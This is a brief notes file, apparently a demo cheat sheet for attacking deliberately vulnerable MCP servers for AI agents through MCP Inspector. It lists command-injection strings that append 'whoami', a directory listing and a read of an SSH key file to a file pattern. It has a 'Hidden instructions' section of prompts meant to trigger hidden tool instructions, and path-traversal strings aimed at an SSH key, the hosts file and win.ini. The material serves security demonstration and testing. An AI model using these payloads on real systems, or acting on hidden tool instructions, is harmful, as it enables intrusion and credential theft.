@@ -1,0 +1,21 @@
+MCP Inspector
+npx @modelcontextprotocol/inspector py vuln_agent_mcp_resource_path_tampering.py
+npx @modelcontextprotocol/inspector py vuln_agent_mcp.py
+
+
+Command injection (vuln_agent_mcp.py)
+*.txt" & whoami
+*.txt" & type "C:\users\kkmookhey\ssh_key.txt"
+*.txt" & dir C:\
+
+Hidden instructions
+Search files in the C:\tools\mcp_test directory
+Count the number of files in C:\users\kkmookhey
+Get the file size of assets.csv in C:\tools\mcp_test
+
+Sampling - code walkthrough
+
+
+..\..\Users\kkmookhey\ssh_key.txt
+..\..\Windows\System32\drivers\etc\hosts
+..\..\Windows\win.ini
